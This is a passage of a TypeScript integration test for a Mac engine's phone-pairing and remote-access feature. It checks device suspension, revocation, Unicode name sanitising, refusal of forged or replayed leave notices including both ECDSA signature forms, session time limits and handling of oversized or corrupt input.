	await app.call("devices.resume", { device: phone.id });
	// A clock more than two minutes off: `clock`, counted as before; five, with the two above resumed away, suspend.
	for (let i = 0; i < 5; i++) {
		assert.deepEqual(offerRefusal(await offer(p256(), { at: Date.now() + 3 * 60_000 })), ["The offer's time is more than two minutes from the Mac's.", "clock"], "a clock three minutes off is told clock");
	}
	await app.until("five offers with the wrong clock suspend the device", () => recordOf().suspendedAt !== null);
	// Suspended: `suspended` for an offer the device key signed, none for one it did not; neither counted nor logged.
	const beforeSuspended = await refusedOffers();
	assert.deepEqual(offerRefusal(await offer(p256())), ["This device is suspended. Resume it on the Mac's Devices page.", "suspended"], "a suspended device's offer is told suspended");
	const strangers = await offer(p256(), { device: p256().privateKey });
	assert.deepEqual([strangers.error, strangers.data], ["This device is suspended. Resume it on the Mac's Devices page.", undefined], "one the device key did not sign is told no reason");
	assert.equal(await refusedOffers(), beforeSuspended, "neither is logged");
	await app.call("devices.resume", { device: phone.id });
	await app.until("the device resumed", () => recordOf().suspendedAt === null);
	step("an offer's refusals carry the attach's reasons: update and suspended uncounted, clock counted, the same words and log; a second key while one waits counted with no reason, and no reason for any other");

	// ---- pi² Remote stopping, then revocation (3.6)
	const later = await attach();
	const session3 = later.reply.result.session as string;
	await until("the third session's greeting", () => remote.sessionLines.get(session3)?.some((line) => line.event === "device"));
	process.kill(remote.standIn!.pid, "SIGKILL");
	const restarted = await nextRemote(2);
	assert.equal(restarted.standIn!.ppid, engine.pid);
	assert.deepEqual((await restarted.event("start")).devices.map((one: any) => one.id), [phone.id], "a new pi² Remote is given the paired devices' keys");
	await app.until("the session gone with pi² Remote", () => !app.devicesEvents.at(-1)?.sessions.some((one: any) => one.session === session3));
	await app.until("pi² Remote's stop counted", () => app.devicesEvents.at(-1)?.helper.stoppedInLastHour >= 1);
	const challenge = (await restarted.call("remote.attachBegin")).result.challenge;
	const channel = randomBytes(32);
	const fourth = await restarted.call("remote.attach", { attach: phone.attach({ pairing: remote.pairing, challenge, binding: channel }), binding: b64url(channel), path: "home" });
	const session4 = fourth.result.session as string;
	await until("the fourth session's greeting", () => restarted.sessionLines.get(session4)?.some((line) => line.event === "device"));
	// A key waiting when the device is revoked goes with its other keys (#786).
	assert.deepEqual((await offer(p256(), { via: restarted })).result, { waiting: true });
	await app.until("a key waiting before the revocation", () => recordOf().pendingPresenceKey !== null);
	const revokedAt = restarted.events.length;
	await app.call("devices.revoke", { device: phone.id });
	const told = await until("the revoked device told", () => restarted.sessionLines.get(session4)?.find((line) => line.event === "device" && line.revoked === true));
	assert.equal(told.id, phone.id);
	assert.equal((await restarted.event("sessionClosed", revokedAt)).session, session4);
	assert.equal((await restarted.event("revoke", revokedAt)).device, phone.id);
	const told2 = restarted.events.slice(revokedAt).map((event) => event.kind);
	assert.ok(told2.indexOf("revoke") < told2.indexOf("sessionClosed"), `revoke goes before the session is closed, for the phone's revoked line: ${told2.join(" ")}`);
	const record = app.devicesEvents.at(-1).devices.find((one: any) => one.id === phone.id);
	assert.ok(record.revokedAt !== null && record.deviceKey === "" && record.presenceKey === null, "its keys are forgotten in the same commit");
	assert.equal(record.pendingPresenceKey, null, "the waiting Face ID key with them");
	assert.match((await offer(p256(), { via: restarted })).error, /revoked/, "and a revoked device offers nothing");
	await assert.rejects(app.call("devices.acceptPresenceKey", { device: phone.id }), /No such device is paired/, "and cannot be accepted once revoked");
	const afterRevoke = await restarted.call("remote.attachBegin");
	const channel2 = randomBytes(32);
	const revokedReply = await restarted.call("remote.attach", { attach: phone.attach({ pairing: remote.pairing, challenge: afterRevoke.result.challenge, binding: channel2 }), binding: b64url(channel2), path: "relay" });
	assert.match(revokedReply.error, /revoked/);
	assert.equal(revokedReply.data, undefined, "a revoked device is told no reason");
	// Nothing is pushed to it (#689): a push goes to pi² Remote before the app is sent the `needs` event that made it, so
	// one written would be read before the answer to a request sent after that event.
	void app.call("submit", { id: plain, text: "/bash echo after the revocation" });
	const afterRevocation = await app.until("an approval after the revocation", () =>
		app.events.needs?.items?.find((item: any) => item.kind === "approval" && item.arguments?.command === "echo after the revocation"),
	);
	await restarted.call("remote.attachBegin");
	assert.ok(!restarted.events.slice(revokedAt).some((event) => event.kind === "push" && (event.push.device === phone.id || event.push.body?.need === afterRevocation.id)), "nothing is pushed to a revoked device");
	await app.call("inbox.decide", { id: afterRevocation.id, decision: "deny" });
	step("pi² Remote stopping closes its sessions and is started again; a revoked device is told, closed, and refused from then on");

	// ---- A revoked device's key cannot pair again (3.3 step 5); pairing needs a running pi² Remote (3.3 step 8)
	const sameKey = Object.assign(new Phone("Alex's iPhone"), { device: phone.device });
	assert.match((await claimIn(sameKey, {}, () => {}, restarted)).reply.error ?? "", /That device key was revoked on this Mac/);
	// A name with a zero-width joiner and a right-to-left override, which RemoteKit does not show: stripped, not refused.
	const phone2 = new Phone("Robin\u200D's\u202E iPhone");
	const second2 = await claimIn(phone2, {}, () => {}, restarted);
	const pairedBefore = restarted.events.length;
	({ device: phone2.id } = await app.call("devices.pairConfirm", { digits: second2.digits }));
	assert.equal(app.devicesEvents.at(-1).devices.find((one: any) => one.id === phone2.id).name, "Robin's iPhone");
	assert.doesNotMatch((await restarted.event("paired", pairedBefore)).paired.name, /[\u200B-\u200F\u202A-\u202E\u2066-\u2069\uFEFF\p{Cc}]/u);
	await app.call("devices.rename", { device: phone2.id, name: "\u200D\u202E\u2066" });
	assert.equal(app.devicesEvents.at(-1).devices.find((one: any) => one.id === phone2.id).name, "iPhone 17 Pro", "a name of nothing shown falls back");
	const waiting = await claimIn(new Phone("Sky's iPhone"), {}, () => {}, restarted);
	assert.ok(waiting.reply.result.claim);
	process.kill(restarted.standIn!.pid, "SIGKILL");
	await app.until("the window closed with pi² Remote", () => /pi² Remote stopped while the code was open/.test(app.devicesEvents.at(-1)?.closed?.why ?? ""));
	await assert.rejects(app.call("devices.pairConfirm", { digits: waiting.digits }), /No phone is waiting/, "nothing is saved that the phone could never be told of");
	const third3 = await nextRemote(3);
	assert.deepEqual((await third3.event("start")).devices.map((one: any) => one.id), [phone2.id]);
	// Robin's pairing was the engine's last, this last minute, and never attached: a pi² Remote started since was sent
	// no `paired` for it, and takes it back no more than any other (#887).
	assert.match((await third3.call("remote.pairUnkept", { device: phone2.id })).error ?? "", /may take back only the device it was last sent paired for/, "after pi² Remote restarted");
	assert.ok(app.devicesEvents.at(-1).devices.some((one: any) => one.id === phone2.id && one.revokedAt === null), "and the device is kept");
	step("a revoked device's key cannot pair again; a claim whose pi² Remote stopped closes the window, and nothing is saved; a pi² Remote started since takes back no pairing");

	// ---- A phone's leave, passed on by the relay (3.6, #929): the device revoked on its own device key's notice alone
	// Kit pairs, then unpairs on the phone; Robin's stays paired. The engine takes the identity key the running pi² Remote
	// said hello with.
	const leaver = new Phone("Kit's iPhone");
	const kitClaim = await claimIn(leaver, {}, () => {}, third3);
	({ device: leaver.id } = await app.call("devices.pairConfirm", { digits: kitClaim.digits }));
	await app.until("the identity key of pi² Remote number 3", () => app.devicesEvents.at(-1)?.macKeys?.identity === third3.macKeys.identity);
	const leaveText = (fields: { pairing?: string; device?: string; mac?: string; at?: number } = {}) =>
		JSON.stringify({ v: 2, kind: "leave", pairing: fields.pairing ?? remote.pairing, device: fields.device ?? leaver.id, mac: fields.mac ?? third3.macKeys.identity, at: fields.at ?? Date.now() });
	const leave = (text: string, key: KeyObject = leaver.device.privateKey, extra: Record<string, unknown> = {}) =>
		third3.call("remote.left", { device: JSON.parse(text).device, at: JSON.parse(text).at, notice: signText(text, key), ...extra });
	const leaverPaired = () => app.devicesEvents.at(-1).devices.some((one: any) => one.id === leaver.id && one.revokedAt === null);
	const beforeLeave = third3.events.length;
	const refusedLeaves: [any, RegExp, string][] = [
		[await third3.call("remote.left", {}), new RegExp(NOT_A_LEAVE.replace(/[().]/g, "\\$&")), "nothing"],
		[await leave(leaveText(), leaver.device.privateKey, { deviceKey: spki(p256().publicKey) }), /takes a device, its time and its notice/, "a key named beside it, as a relay could"],
		[await third3.call("remote.left", { device: leaver.id, at: Date.now(), notice: b64url(randomBytes(63)) }), /takes a device/, "a notice of 63 bytes"],
		[await third3.call("remote.left", { device: leaver.id, at: String(Date.now()), notice: b64url(randomBytes(64)) }), /takes a device/, "a time that is text"],
		[await third3.call("remote.left", { device: leaver.id, at: 0, notice: b64url(randomBytes(64)) }), /takes a device/, "no time"],
		[await leave(leaveText({ device: "dev_none" })), /No such device is paired/, "a device never paired"],
		[await leave(leaveText(), p256().privateKey), new RegExp(LEAVE_NOT_SIGNED), "a stranger's key"],
		[await leave(leaveText(), phone2.device.privateKey), new RegExp(LEAVE_NOT_SIGNED), "another paired device's key, Robin's"],
		[await leave(leaveText({ device: phone2.id }), leaver.device.privateKey), new RegExp(LEAVE_NOT_SIGNED), "Robin's leave signed by Kit's key"],
		[await leave(leaveText(), phone.device.privateKey), new RegExp(LEAVE_NOT_SIGNED), "a revoked device's key, Alex's"],
		[await leave(leaveText({ mac: remote.macKeys.identity })), new RegExp(LEAVE_NOT_SIGNED), "a leave for another Mac"],
		[await leave(leaveText({ pairing: b64url(randomBytes(16)) })), new RegExp(LEAVE_NOT_SIGNED), "another pairing"],
		[await leave(leaveText({ at: Date.now() + 11 * 60_000 })), /more than ten minutes ahead/, "eleven minutes ahead of the Mac's clock"],
	];
	for (const [reply, expected, what] of refusedLeaves) assert.match(reply.error ?? JSON.stringify(reply), expected, what);
	// What is signed must be what is checked: a notice over one time, given with another.
	const signedAt = leaveText({ at: Date.now() - 1_000 });
	assert.match((await third3.call("remote.left", { device: leaver.id, at: Date.now(), notice: signText(signedAt, leaver.device.privateKey) })).error, new RegExp(LEAVE_NOT_SIGNED), "another time");
	assert.ok(leaverPaired() && app.devicesEvents.at(-1).devices.some((one: any) => one.id === phone2.id && one.revokedAt === null), "none of these revokes a device");
	assert.ok(!third3.events.slice(beforeLeave).some((event) => event.kind === "revoke"), "nor tells pi² Remote to");
	assert.ok(!(await app.call("devices.log", { device: leaver.id })).entries.some((entry: any) => entry.method === "leave"), "nor logs a leave");
	// The genuine leave, a hundred days old (a relay keeps it for a Mac that is away), given at once in both forms of its
	// ECDSA signature, s and n − s, which verify alike: the device is revoked once.
	const genuine = leaveText({ at: Date.now() - 100 * 86_400_000 });
	const low = Buffer.from(signText(genuine, leaver.device.privateKey), "base64url");
	const order = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551n;
	const high = Buffer.concat([low.subarray(0, 32), Buffer.from((order - BigInt(`0x${low.subarray(32).toString("hex")}`)).toString(16).padStart(64, "0"), "hex")]);
	const beforeGenuine = app.devicesEvents.length;
	const both = await Promise.all([high, low].map((notice) => third3.call("remote.left", { device: leaver.id, at: JSON.parse(genuine).at, notice: b64url(notice) })));
	assert.deepEqual(both.map((reply) => reply.result?.revoked).sort(), [false, true], `the leave in both forms at once: revoked once, the other answered as a repeat (${JSON.stringify(both)})`);
	assert.deepEqual((await third3.call("remote.left", { device: leaver.id, at: JSON.parse(genuine).at, notice: b64url(low) })).result, { revoked: false }, "and again, a repeat the relay may send, harmlessly");
	const leftRecord = app.devicesEvents.at(-1).devices.find((one: any) => one.id === leaver.id);
	assert.ok(leftRecord.revokedAt !== null && leftRecord.deviceKey === "" && leftRecord.channelKey === "", "the device is revoked, its keys forgotten, and the Devices page told (devices)");
	assert.ok(app.devicesEvents.length > beforeGenuine, "by a devices event");
	assert.equal(third3.events.slice(beforeLeave).filter((event) => event.kind === "revoke" && event.device === leaver.id).length, 1, "pi² Remote is told to revoke it, once");
	const leftLog = (await app.call("devices.log", { device: leaver.id })).entries.filter((entry: any) => entry.method === "leave");
	assert.deepEqual(
		leftLog.map((entry: any) => [entry.path, entry.summary, entry.outcome]),
		[["relay", "Unpaired itself on the phone", "done"]],
		"the log says once that the phone unpaired itself, by the relay",
	);
	assert.ok(onDisk((entry) => entry.method === "leave" && entry.device === leaver.id), "stored at once");
	step("a phone's leave revokes its device only with its own device key's notice for this pairing and this Mac, at most ten minutes ahead and however old; refused with another device's key, a stranger's, a key named beside it, another Mac's or pairing, or another time; once, whichever form of the signature, and a repeat harmlessly; logged as unpaired on the phone");

	// ---- Turning remote access off stops pi² Remote; the devices event went to the app alone
	await app.call("devices.set", { on: false });
	await until("pi² Remote stopped", () => third3.closed);
	const other = await EngineClient.connect(engine, home);
	await other.call("engine.info");
	assert.equal(other.events.devices, undefined, "a connection that did not ask is sent no devices event");
	other.close();
	for (const [what, value] of Object.entries({ s: secret.toString("base64url"), "the s in hex": secret.toString("hex"), typed, ...known })) {
		assert.ok(!engineLog.includes(value), `engine.log holds no ${what}`);
	}
	assert.ok(!engineLog.includes("deeper than APPROVAL_DEPTH"), "no line a device was sent held an approval deeper than the gate judges (#881)");
	step("remote access off stops pi² Remote; the devices event goes only to the app's connection that asked");

	// ---- The engine's own bound on a session (4.5, 5.2): a day after its last attach, here shortened
	app.close();
	await stop(engine);
	const limited = spawn(process.execPath, [main], { env: { ...env, PI2_DEVICE_SESSION_MS: "2000" }, stdio: ["ignore", "ignore", "pipe"] });
	engines.push(limited);
	let limitedLog = "";
	limited.stderr!.setEncoding("utf8").on("data", (text: string) => {
		limitedLog += text;
		process.stderr.write(text);
	});
	const macApp = await App.connect(limited, home);
	try {
		await macApp.call("devices.watch");
		await macApp.call("devices.set", { on: true });
		const fourth4 = await nextRemote(4);
		const challenge4 = (await fourth4.call("remote.attachBegin")).result.challenge;
		const channel4 = randomBytes(32);
		const { result } = await fourth4.call("remote.attach", { attach: phone2.attach({ pairing: remote.pairing, challenge: challenge4, binding: channel4 }), binding: b64url(channel4), path: "relay" });
		const over = await until("the session's bound", () => fourth4.events.find((event) => event.kind === "sessionClosed" && event.session === result.session));
		assert.equal(over.why, SESSION_OVER, "the engine ended the session itself, with pi² Remote still connected");
		assert.equal(fourth4.closed, false);
		assert.equal((await fourth4.inSession(result.session, "engine.info")).error, OPEN_WITH_FACE_ID);
		step("the engine ends a session itself at its bound after the last attach, whatever pi² Remote does");
		// A line exactly as long as the engine takes from pi² Remote is taken (#904)...
		const edgeHead = JSON.stringify({ session: result.session, message: { id: "edge", method: "engine.info", params: { pad: "" } } });
		const edgeLine = `${edgeHead.slice(0, -4)}${"e".repeat(MAX_HELPER_LINE - edgeHead.length)}${edgeHead.slice(-4)}`;
		assert.equal(edgeLine.length, MAX_HELPER_LINE);
		fourth4.socket.write(`${edgeLine}\n`);
		assert.equal((await until("the answer at the edge", () => fourth4.sessionLines.get(result.session)?.find((message) => message.id === "edge"), { over: () => (fourth4.closed ? "pi² Remote's connection closed" : undefined) })).error, OPEN_WITH_FACE_ID);
		assert.equal(fourth4.closed, false, "and pi² Remote is not stopped for it");
		// ...and one longer than any a phone may send stops pi² Remote, as a crash does, and it is started again.
		const beforeLong = macApp.devicesEvents.length;
		fourth4.socket.write("x".repeat(MAX_HELPER_LINE + 1));
		await until("pi² Remote stopped for its line", () => fourth4.closed);
		assert.equal((await nextRemote(5)).standIn!.ppid, limited.pid, "and started again");
		await macApp.until("the stop counted as unexpected", () => macApp.devicesEvents.slice(beforeLong).some((event) => event.helper.stoppedInLastHour >= 1));
		// Again, from the pi² Remote that said hello since: the wait grows, a hello does not bring it back (#881).
		const fifth = await nextRemote(5);
		await until("the fifth pi² Remote's hello answered", () => macApp.devicesEvents.at(-1)?.helper.running === true || undefined);
		fifth.socket.write("x".repeat(MAX_HELPER_LINE + 1));
		await until("pi² Remote stopped again for its line", () => fifth.closed);
		await nextRemote(6);
		assert.deepEqual([...limitedLog.matchAll(/pi² Remote will be started again in (\d+) s/g)].map((found) => found[1]), ["1", "2"], "a second, then two");
		step("a line from pi² Remote longer than any a phone may send stops it, counted as an unexpected stop, and it is started again, a second later and then two");
	} finally {
		macApp.close();
		await stop(limited);
	}

	// ---- A record that cannot be read refuses devices, and stops nothing else
	const store = await Harness.open(await openNodeSqliteStorage(join(home, "session.sqlite")), { registry: createRegistry(), models: createModels() }, context);
	await store.commit(async (tx) => {
		(await tx.doc(Devices) as unknown as { devices: unknown }).devices = "garbled";
	}, context);
	await store.close(context);
	const broken = spawn(process.execPath, [main], { env, stdio: ["ignore", "ignore", "inherit"] });
	engines.push(broken);
	const brokenApp = await App.connect(broken, home);
	try {
		const event = await brokenApp.call("devices.watch");
		assert.match(event.unreadable, /^pi²'s record of paired devices could not be read \(its devices are not a list\), so no device can pair or connect/);
		for (const [method, params] of [["devices.pairStart", {}], ["devices.set", { on: true }], ["devices.log", {}], ["devices.revoke", { device: phone2.id }]] as const) {
			await assert.rejects(brokenApp.call(method, params), /could not be read/, method);
		}
		const { id: works } = await brokenApp.call("conversation.create", { model: { provider: "demo", modelId: "demo-1" } });
		assert.equal(typeof works, "number", "the rest of the engine works");
		assert.ok(!childrenOf(broken.pid!).some((command) => command.includes(standIn)), "and no pi² Remote is started");
		step("a record of devices that cannot be read stops no start: devices are refused, the Devices page told why, the rest works");
	} finally {
		brokenApp.close();
		await stop(broken);
	}
} finally {
	app.close();
	await stop(engine);
	server.close();
}
